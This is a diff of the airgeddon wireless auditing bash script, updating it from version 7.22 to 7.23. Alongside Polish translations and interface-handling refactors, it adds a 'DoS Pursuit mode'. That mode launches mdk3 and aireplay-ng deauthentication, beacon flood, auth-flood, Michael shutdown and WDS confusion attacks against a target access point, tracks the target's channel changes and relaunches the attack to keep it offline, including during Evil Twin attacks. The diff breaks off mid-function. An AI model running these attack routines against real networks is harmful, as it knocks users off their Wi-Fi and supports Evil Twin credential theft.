@@ -2,8 +2,8 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20171004
-#Version......: 7.22
+#Date.........: 20171110
+#Version......: 7.23
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -31,6 +31,7 @@ declare -A lang_association=(
 								["ru"]="RUSSIAN"
 								["gr"]="GREEK"
 								["it"]="ITALIAN"
+								["pl"]="POLISH"
 							)
 
 #Tools vars
@@ -110,8 +111,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="7.22"
-language_strings_expected_version="7.22-1"
+airgeddon_version="7.23"
+language_strings_expected_version="7.23-1"
 standardhandshake_filename="handshake-01.cap"
 tmpdir="/tmp/"
 osversionfile_dir="/etc/"
@@ -224,6 +225,7 @@ attemptsfile="ag.et_attempts.txt"
 currentpassfile="ag.et_currentpass.txt"
 successfile="ag.et_success.txt"
 processesfile="ag.et_processes.txt"
+channelfile="ag.et_channel.txt"
 possible_dhcp_leases_files=(
 								"/var/lib/dhcp/dhcpd.leases"
 								"/var/state/dhcp/dhcpd.leases"
@@ -278,8 +280,8 @@ declare decrypt_hints=(171 178 179 208 244 163)
 declare select_interface_hints=(246)
 declare language_hints=(250 438)
 declare option_hints=(445 250 448 477)
-declare evil_twin_hints=(254 258 264 269 309 328 400)
-declare evil_twin_dos_hints=(267 268)
+declare evil_twin_hints=(254 258 264 269 309 328 400 509)
+declare evil_twin_dos_hints=(267 268 509)
 declare beef_hints=(408)
 declare wps_hints=(342 343 344 356 369 390 490)
 declare wep_hints=(431 429 428 432 433)
@@ -410,6 +412,7 @@ function language_strings_handling_messages() {
 	language_strings_no_file["RUSSIAN"]="Ошибка. Не найден языковой файл"
 	language_strings_no_file["GREEK"]="Σφάλμα. Το αρχείο γλωσσών δεν βρέθηκε"
 	language_strings_no_file["ITALIAN"]="Errore. Non si trova il file delle traduzioni"
+	language_strings_no_file["POLISH"]="Błąd. Nie znaleziono pliku tłumaczenia"
 
 	declare -gA language_strings_file_mismatch
 	language_strings_file_mismatch["ENGLISH"]="Error. The language strings file found mismatches expected version"
@@ -420,6 +423,7 @@ function language_strings_handling_messages() {
 	language_strings_file_mismatch["RUSSIAN"]="Ошибка. Языковой файл не соответствует ожидаемой версии"
 	language_strings_file_mismatch["GREEK"]="Σφάλμα. Το αρχείο γλωσσών που έχει βρεθεί δεν αντιστοιχεί με την προαπαιτούμενη έκδοση"
 	language_strings_file_mismatch["ITALIAN"]="Errore. Il file delle traduzioni trovato non è la versione prevista"
+	language_strings_file_mismatch["POLISH"]="Błąd. Znaleziony plik tłumaczenia nie jest oczekiwaną wersją"
 
 	declare -gA language_strings_try_to_download
 	language_strings_try_to_download["ENGLISH"]="airgeddon will try to download the language strings file..."
@@ -430,6 +434,7 @@ function language_strings_handling_messages() {
 	language_strings_try_to_download["RUSSIAN"]="airgeddon попытается загрузить языковой файл..."
 	language_strings_try_to_download["GREEK"]="Το airgeddon θα προσπαθήσει να κατεβάσει το αρχείο γλωσσών..."
 	language_strings_try_to_download["ITALIAN"]="airgeddon cercherá di scaricare il file delle traduzioni..."
+	language_strings_try_to_download["POLISH"]="airgeddon spróbuje pobrać plik tłumaczeń..."
 
 	declare -gA language_strings_successfully_downloaded
 	language_strings_successfully_downloaded["ENGLISH"]="Language strings file was successfully downloaded"
@@ -440,6 +445,7 @@ function language_strings_handling_messages() {
 	language_strings_successfully_downloaded["RUSSIAN"]="Языковой файл был успешно загружен"
 	language_strings_successfully_downloaded["GREEK"]="Το αρχείο γλωσσών κατέβηκε με επιτυχία"
 	language_strings_successfully_downloaded["ITALIAN"]="Il file delle traduzioni è stato scaricato con successo"
+	language_strings_successfully_downloaded["POLISH"]="Plik z tłumaczeniem został pomyślnie pobrany"
 
 	declare -gA language_strings_failed_downloading
 	language_strings_failed_downloading["ENGLISH"]="The language string file can't be downloaded. Check your internet connection or download it manually from ${normal_color}${urlgithub}"
@@ -450,6 +456,7 @@ function language_strings_handling_messages() {
 	language_strings_failed_downloading["RUSSIAN"]="Языковой файл не может быть загружен. Проверьте подключение к Интернету или загрузите его вручную с ${normal_color}${urlgithub}"
 	language_strings_failed_downloading["GREEK"]="Το αρχείο γλωσσών δεν μπορεί να κατέβει. Ελέγξτε τη σύνδεση σας με το διαδίκτυο ή κατεβάστε το χειροκίνητα ${normal_color}${urlgithub}"
 	language_strings_failed_downloading["ITALIAN"]="Impossibile scaricare il file delle traduzioni. Controlla la tua connessione a internet o scaricalo manualmente ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["POLISH"]="Nie można pobrać pliku tłumaczenia. Sprawdź połączenie internetowe lub pobierz go ręcznie z ${normal_color}${urlgithub}"
 
 	declare -gA language_strings_first_time
 	language_strings_first_time["ENGLISH"]="If you are seeing this message after an automatic update, don't be scared! It's probably because airgeddon has different file structure since version 6.1. It will be automatically fixed"
@@ -460,6 +467,7 @@ function language_strings_handling_messages() {
 	language_strings_first_time["RUSSIAN"]="Если вы видите это сообщение после автоматического обновления, не переживайте! Вероятно, это объясняется тем, что, начиная с версии 6.1, airgeddon имеет другую структуру файлов. Проблема будет разрешена автоматически"
 	language_strings_first_time["GREEK"]="Εάν βλέπετε αυτό το μήνυμα μετά από κάποια αυτόματη ενημέρωση, μην τρομάξετε! Πιθανόν είναι λόγω της διαφορετικής δομής του airgeddon μετά από την έκδοση 6.1. Θα επιδιορθωθεί αυτόματα"
 	language_strings_first_time["ITALIAN"]="Se stai vedendo questo messaggio dopo un aggiornamento automatico, niente panico! probabilmente è perché a partire dalla versione 6.1 é cambiata la struttura dei file di airgeddon. Sarà riparato automaticamente"
+	language_strings_first_time["POLISH"]="Jeśli widzisz tę wiadomość po automatycznej aktualizacji, nie obawiaj się! To prawdopodobnie dlatego, że w wersji 6.1 zmieniła się struktura plików airgeddon. Naprawi się automatycznie"
 
 	declare -gA language_strings_exiting
 	language_strings_exiting["ENGLISH"]="Exiting airgeddon script v${airgeddon_version} - See you soon! :)"
@@ -470,6 +478,7 @@ function language_strings_handling_messages() {
 	language_strings_exiting["RUSSIAN"]="Выход из скрипта airgeddon v${airgeddon_version} - До встречи! :)"
 	language_strings_exiting["GREEK"]="Κλείσιμο του airgeddon v${airgeddon_version} - Αντίο :)"
 	language_strings_exiting["ITALIAN"]="Uscendo dallo script airgeddon v${airgeddon_version} - A presto! :)"
+	language_strings_exiting["POLISH"]="Wyjście z skryptu airgeddon v${airgeddon_version} - Do zobaczenia wkrótce! :)"
 
 	declare -gA language_strings_key_to_continue
 	language_strings_key_to_continue["ENGLISH"]="Press [Enter] key to continue..."
@@ -480,6 +489,7 @@ function language_strings_handling_messages() {
 	language_strings_key_to_continue["RUSSIAN"]="Нажмите клавишу [Enter] для продолжения..."
 	language_strings_key_to_continue["GREEK"]="Πατήστε το κουμπί [Enter] για να συνεχίσετε..."
 	language_strings_key_to_continue["ITALIAN"]="Premere il tasto [Enter] per continuare..."
+	language_strings_key_to_continue["POLISH"]="Naciśnij klawisz [Enter] aby kontynuować..."
 }
 
 #Toggle language auto-detection feature
@@ -704,7 +714,7 @@ function check_to_set_managed() {
 
 	debug_print
 
-	check_interface_mode
+	check_interface_mode "${1}"
 	case "${ifacemode}" in
 		"Managed")
 			echo
@@ -727,7 +737,7 @@ function check_to_set_monitor() {
 
 	debug_print
 
-	check_interface_mode
+	check_interface_mode "${1}"
 	case "${ifacemode}" in
 		"Monitor")
 			echo
@@ -750,12 +760,11 @@ function check_monitor_enabled() {
 
 	debug_print
 
-	mode=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)
+	mode=$(iwconfig "${1}" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)
+
+	current_iface_on_messages="${1}"
 
 	if [[ ${mode} != "Monitor" ]]; then
-		echo
-		language_strings "${language}" 14 "red"
-		language_strings "${language}" 115 "read"
 		return 1
 	fi
 	return 0
@@ -766,7 +775,7 @@ function check_interface_wifi() {
 
 	debug_print
 
-	execute_iwconfig_fix
+	execute_iwconfig_fix "${1}"
 	return $?
 }
 
@@ -776,7 +785,8 @@ function execute_iwconfig_fix() {
 	debug_print
 
 	iwconfig_fix
-	iwcmd="iwconfig ${interface} ${iwcmdfix} > /dev/null 2> /dev/null"
+	current_iface_on_messages="${1}"
+	iwcmd="iwconfig ${1} ${iwcmdfix} > /dev/null 2> /dev/null"
 	eval "${iwcmd}"
 
 	return $?
@@ -1160,6 +1170,7 @@ function prepare_et_interface() {
 		if [ "${interface}" != "${new_interface}" ]; then
 			if check_interface_coherence; then
 				interface=${new_interface}
+				current_iface_on_messages="${interface}"
 			fi
 			echo
 			language_strings "${language}" 15 "yellow"
@@ -1200,6 +1211,7 @@ function restore_et_interface() {
 		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
 		if [ "${interface}" != "${new_interface}" ]; then
 			interface=${new_interface}
+			current_iface_on_messages="${interface}"
 		fi
 	fi
 }
@@ -1219,30 +1231,44 @@ function managed_option() {
 
 	debug_print
 
-	if ! check_to_set_managed; then
-		return
+	if ! check_to_set_managed "${1}"; then
+		return 1
 	fi
 
 	disable_rfkill
 
 	language_strings "${language}" 17 "blue"
-	ifconfig "${interface}" up
+	ifconfig "${1}" up
 
-	new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station | head -n 1)
-	ifacemode="Managed"
-	[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+	if [ "${1}" = "${interface}" ]; then
+		new_interface=$(${airmon} stop "${1}" 2> /dev/null | grep station | head -n 1)
+		ifacemode="Managed"
+		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
 
-	if [ "${interface}" != "${new_interface}" ]; then
-		if check_interface_coherence; then
-			interface=${new_interface}
+		if [ "${interface}" != "${new_interface}" ]; then
+			if check_interface_coherence; then
+				interface=${new_interface}
+				current_iface_on_messages="${interface}"
+			fi
+			echo
+			language_strings "${language}" 15 "yellow"
 		fi
-		echo
-		language_strings "${language}" 15 "yellow"
+	else
+		new_secondary_interface=$(${airmon} stop "${1}" 2> /dev/null | grep station | head -n 1)
+		[[ ${new_secondary_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_secondary_interface="${BASH_REMATCH[1]}"
+
+		if [ "${1}" != "${new_secondary_interface}" ]; then
+			secondary_wifi_interface=${new_secondary_interface}
+			current_iface_on_messages="${secondary_wifi_interface}"
+			echo
+			language_strings "${language}" 15 "yellow"
+		fi
 	fi
 
 	echo
 	language_strings "${language}" 16 "yellow"
 	language_strings "${language}" 115 "read"
+	return 0
 }
 
 #Put the interface on monitor mode and manage the possible name change
@@ -1250,21 +1276,21 @@ function monitor_option() {
 
 	debug_print
 
-	if ! check_to_set_monitor; then
-		return
+	if ! check_to_set_monitor "${1}"; then
+		return 1
 	fi
 
 	disable_rfkill
 
 	language_strings "${language}" 18 "blue"
 
-	ifconfig "${interface}" up
+	ifconfig "${1}" up
 
-	if ! iwconfig "${interface}" rate 1M > /dev/null 2>&1; then
+	if ! iwconfig "${1}" rate 1M > /dev/null 2>&1; then
 		echo
 		language_strings "${language}" 20 "red"
 		language_strings "${language}" 115 "read"
-		return
+		return 1
 	fi
 
 	if [ "${check_kill_needed}" -eq 1 ]; then
@@ -1273,31 +1299,49 @@ function monitor_option() {
 		nm_processes_killed=1
 	fi
 
-	new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
-
 	desired_interface_name=""
-	[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
+	if [ "${1}" = "${interface}" ]; then
+		new_interface=$(${airmon} start "${1}" 2> /dev/null | grep monitor)
+		[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
+	else
+		new_secondary_interface=$(${airmon} start "${1}" 2> /dev/null | grep monitor)
+		[[ ${new_secondary_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
+	fi
+
 	if [ -n "${desired_interface_name}" ]; then
 		echo
 		language_strings "${language}" 435 "red"
 		language_strings "${language}" 115 "read"
-		return
+		return 1
 	fi
 
-	ifacemode="Monitor"
-	[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+	if [ "${1}" = "${interface}" ]; then
+		ifacemode="Monitor"
+		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
 
-	if [ "${interface}" != "${new_interface}" ]; then
-		if check_interface_coherence; then
-			interface=${new_interface}
+		if [ "${interface}" != "${new_interface}" ]; then
+			if check_interface_coherence; then
+				interface="${new_interface}"
+				current_iface_on_messages="${interface}"
+			fi
+			echo
+			language_strings "${language}" 21 "yellow"
 		fi
-		echo
-		language_strings "${language}" 21 "yellow"
+	else
+		[[ ${new_secondary_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_secondary_interface="${BASH_REMATCH[1]}"
+
+		if [ "${1}" != "${new_secondary_interface}" ]; then
+			secondary_wifi_interface="${new_secondary_interface}"
+			current_iface_on_messages="${secondary_wifi_interface}"
+			echo
+			language_strings "${language}" 21 "yellow"
+		fi
 	fi
 
 	echo
 	language_strings "${language}" 22 "yellow"
 	language_strings "${language}" 115 "read"
+	return 0
 }
 
 #Check the interface mode
@@ -1305,19 +1349,20 @@ function check_interface_mode() {
 
 	debug_print
 
-	if ! execute_iwconfig_fix; then
+	current_iface_on_messages="${1}"
+	if ! execute_iwconfig_fix "${1}"; then
 		ifacemode="(Non wifi card)"
 		return 0
 	fi
 
-	modemanaged=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | cut -d ':' -f 2 | cut -d ' ' -f 1)
+	modemanaged=$(iwconfig "${1}" 2> /dev/null | grep Mode: | cut -d ':' -f 2 | cut -d ' ' -f 1)
 
 	if [[ ${modemanaged} = "Managed" ]]; then
 		ifacemode="Managed"
 		return 0
 	fi
 
-	modemonitor=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)
+	modemonitor=$(iwconfig "${1}" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)
 
 	if [[ ${modemonitor} = "Monitor" ]]; then
 		ifacemode="Monitor"
@@ -1516,6 +1561,7 @@ function language_menu() {
 	language_strings "${language}" 308
 	language_strings "${language}" 320
 	language_strings "${language}" 482
+	language_strings "${language}" 58
 	print_simple_separator
 	language_strings "${language}" 446
 	print_hint ${current_menu}
@@ -1596,6 +1642,15 @@ function language_menu() {
 			language_strings "${language}" 115 "read"
 		;;
 		9)
+			if [ "${language}" = "POLISH" ]; then
+				language_strings "${language}" 251 "red"
+			else
+				language="POLISH"
+				language_strings "${language}" 57 "yellow"
+			fi
+			language_strings "${language}" 115 "read"
+		;;
+		10)
 			return
 		;;
 		*)
@@ -1655,8 +1710,50 @@ function set_chipset() {
 	fi
 }
 
-#Internet interface selection menu
-function select_internet_interface() {
+#Manage and validate the prerequisites for DoS Pursuit mode integrated on Evil Twin attacks
+function dos_pursuit_mode_et_handler() {
+
+	debug_print
+
+	ask_yesno 505 "no"
+	if [ "${yesno}" = "y" ]; then
+		dos_pursuit_mode=1
+
+		if [ "${et_dos_attack}" = "Wds Confusion" ]; then
+			echo
+			language_strings "${language}" 508 "yellow"
+			language_strings "${language}" 115 "read"
+		fi
+
+		if select_secondary_et_interface "dos_pursuit_mode"; then
+			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
+				echo
+				language_strings "${language}" 14 "yellow"
+				echo
+				language_strings "${language}" 513 "blue"
+				language_strings "${language}" 115 "read"
+				echo
+				if ! monitor_option "${secondary_wifi_interface}"; then
+					return_to_et_main_menu=1
+					return
+				else
+					echo
+					language_strings "${language}" 34 "yellow"
+					language_strings "${language}" 115 "read"
+				fi
+			else
+				echo
+				language_strings "${language}" 34 "yellow"
+				language_strings "${language}" 115 "read"
+			fi
+		else
+			return
+		fi
+	fi
+}
+
+#Secondary interface selection menu for Evil Twin attacks
+function select_secondary_et_interface() {
 
 	debug_print
 
@@ -1684,13 +1781,24 @@ function select_internet_interface() {
 		;;
 	esac
 
-	inet_ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep lo -v | grep "${interface}" -v)
+	if [ "${1}" = "dos_pursuit_mode" ]; then
+		secondary_ifaces=$(iwconfig 2>&1 | grep "802.11" | grep -v "no wireless extensions" | grep "${interface}" -v | awk '{print $1}')
+	elif [ "${1}" = "internet" ]; then
+		secondary_ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep lo -v | grep "${interface}" -v)
+		if [ -n "${secondary_wifi_interface}" ]; then
+			secondary_ifaces=$(echo "${secondary_ifaces}" | grep "${secondary_wifi_interface}" -v)
+		fi
+	fi
 
 	option_counter=0
-	for item in ${inet_ifaces}; do
+	for item in ${secondary_ifaces}; do
 
 		if [ ${option_counter} -eq 0 ]; then
-			language_strings "${language}" 279 "green"
+			if [ "${1}" = "dos_pursuit_mode" ]; then
+				language_strings "${language}" 511 "green"
+			elif [ "${1}" = "internet" ]; then
+				language_strings "${language}" 279 "green"
+			fi
 			print_simple_separator
 		fi
 
@@ -1712,8 +1820,13 @@ function select_internet_interface() {
 	if [ ${option_counter} -eq 0 ]; then
 		return_to_et_main_menu=1
 		return_to_et_main_menu_from_beef=1
+
 		echo
-		language_strings "${language}" 280 "red"
+		if [ "${1}" = "dos_pursuit_mode" ]; then
+			language_strings "${language}" 510 "red"
+		elif [ "${1}" = "internet" ]; then
+			language_strings "${language}" 280 "red"
+		fi
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
@@ -1726,19 +1839,23 @@ function select_internet_interface() {
 	language_strings "${language}" 331
 	print_hint ${current_menu}
 
-	read -r inet_iface
-	if [[ ! ${inet_iface} =~ ^[[:digit:]]+$ ]] || (( inet_iface < 1 || inet_iface > option_counter_back )); then
-		invalid_internet_iface_selected
-	elif [ "${inet_iface}" -eq ${option_counter_back} ]; then
+	read -r secondary_iface
+	if [[ ! ${secondary_iface} =~ ^[[:digit:]]+$ ]] || (( secondary_iface < 1 || secondary_iface > option_counter_back )); then
+		invalid_secondary_iface_selected "dos_pursuit_mode"
+	elif [ "${secondary_iface}" -eq ${option_counter_back} ]; then
 		return_to_et_main_menu=1
 		return_to_et_main_menu_from_beef=1
 		return 1
 	else
 		option_counter2=0
-		for item2 in ${inet_ifaces}; do
+		for item2 in ${secondary_ifaces}; do
 			option_counter2=$((option_counter2 + 1))
-			if [[ "${inet_iface}" = "${option_counter2}" ]]; then
-				internet_interface=${item2}
+			if [[ "${secondary_iface}" = "${option_counter2}" ]]; then
+				if [ "${1}" = "dos_pursuit_mode" ]; then
+					secondary_wifi_interface=${item2}
+				elif [ "${1}" = "internet" ]; then
+					internet_interface=${item2}
+				fi
 				break
 			fi
 		done
@@ -2711,6 +2828,132 @@ function exec_wps_pin_database_reaver_attack() {
 	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
 }
 
+#Execute DoS pursuit mode attack
+function launch_dos_pursuit_mode_attack() {
+
+	debug_print
+
+	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
+	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
+	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
+	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
+
+	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
+		echo
+		language_strings "${language}" 507 "yellow"
+	fi
+
+	recalculate_windows_sizes
+	case "${1}" in
+		"mdk3 amok attack")
+			dos_delay=1
+			interface_pursuit_mode_scan="${interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+		;;
+		"aireplay deauth attack")
+			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+			dos_delay=3
+			interface_pursuit_mode_scan="${interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+		;;
+		"wids / wips / wds confusion attack")
+			dos_delay=10
+			interface_pursuit_mode_scan="${interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+		;;
+		"beacon flood attack")
+			dos_delay=1
+			interface_pursuit_mode_scan="${interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
+		;;
+		"auth dos attack")
+			dos_delay=1
+			interface_pursuit_mode_scan="${interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
+		;;
+		"michael shutdown attack")
+			dos_delay=1
+			interface_pursuit_mode_scan="${interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
+		;;
+		"Mdk3")
+			dos_delay=1
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
+		;;
+		"Aireplay")
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
+			iwconfig "${interface_pursuit_mode_deauth}" channel "${channel}" > /dev/null 2>&1
+			dos_delay=3
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+		;;
+		"Wds Confusion")
+			dos_delay=10
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
+		;;
+	esac
+
+	dos_pursuit_mode_attack_pid=$!
+	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")
+
+	sleep ${dos_delay}
+	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" > /dev/null 2>&1 &
+	dos_pursuit_mode_scan_pid=$!
+	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")
+}
+
+#Parse and control pids for DoS pursuit mode attack
+pid_control_pursuit_mode() {
+
+	debug_print
+
+	if [[ -n "${2}" ]] && [[ "${2}" = "evil_twin" ]]; then
+		rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
+		echo "${channel}" > "${tmpdir}${channelfile}"
+	fi
+
+	while true; do
+		sleep 5
+		if grep "${bssid}" "${tmpdir}dos_pm-01.csv" > /dev/null 2>&1; then
+			readarray -t DOS_PM_LINES_TO_PARSE < <(cat < "${tmpdir}dos_pm-01.csv" 2> /dev/null)
+
+			for item in "${DOS_PM_LINES_TO_PARSE[@]}"; do
+				if [[ "${item}" =~ ${bssid} ]]; then
+					dos_pm_current_channel=$(echo "${item}" | awk -F "," '{print $4}' | sed 's/^[ ^t]*//')
+
+					if [[ "${dos_pm_current_channel}" =~ ^([0-9]+)$ ]] && [[ "${BASH_REMATCH[1]}" -ne 0 ]] && [[ "${BASH_REMATCH[1]}" -ne "${channel}" ]]; then
+						channel="${dos_pm_current_channel}"
+						if [[ -n "${2}" ]] && [[ "${2}" = "evil_twin" ]]; then
+							rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
+							echo "${channel}" > "${tmpdir}${channelfile}"
+						fi
+						kill_dos_pursuit_mode_processes
+						dos_pursuit_mode_pids=()
+						launch_dos_pursuit_mode_attack "${1}" "relaunch"
+					fi
+				fi
+			done
+		fi
+
+		dos_attack_alive=$(ps uax | awk '{print $2}' | grep -E "^${dos_pursuit_mode_attack_pid}$" 2> /dev/null)
+		if [ -z "${dos_attack_alive}" ]; then
+			break
+		fi
+	done
+
+	kill_dos_pursuit_mode_processes
+}
+
 #Execute mdk3 deauth DoS attack
 function exec_mdk3deauth() {
 
@@ -2725,10 +2968,19 @@ function exec_mdk3deauth() {
 	echo "${bssid}" > "${tmpdir}bl.txt"
 
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "mdk3 amok attack" "first_time"
+		pid_control_pursuit_mode "mdk3 amok attack"
+	else
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
+	fi
 }
 
 #Execute aireplay DoS attack
@@ -2740,13 +2992,24 @@ function exec_aireplaydeauth() {
 	language_strings "${language}" 90 "title"
 	language_strings "${language}" 32 "green"
 
-	${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+	tmpfiles_toclean=1
 
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "aireplay deauth attack" "first_time"
+		pid_control_pursuit_mode "aireplay deauth attack"
+	else
+		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
+	fi
 }
 
 #Execute WDS confusion DoS attack
@@ -2758,11 +3021,22 @@ function exec_wdsconfusion() {
 	language_strings "${language}" 91 "title"
 	language_strings "${language}" 32 "green"
 
+	tmpfiles_toclean=1
+
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "wids / wips / wds confusion attack" "first_time"
+		pid_control_pursuit_mode "wids / wips / wds confusion attack"
+	else
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
+	fi
 }
 
 #Execute Beacon flood DoS attack
@@ -2774,11 +3048,22 @@ function exec_beaconflood() {
 	language_strings "${language}" 92 "title"
 	language_strings "${language}" 32 "green"
 
+	tmpfiles_toclean=1
+
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
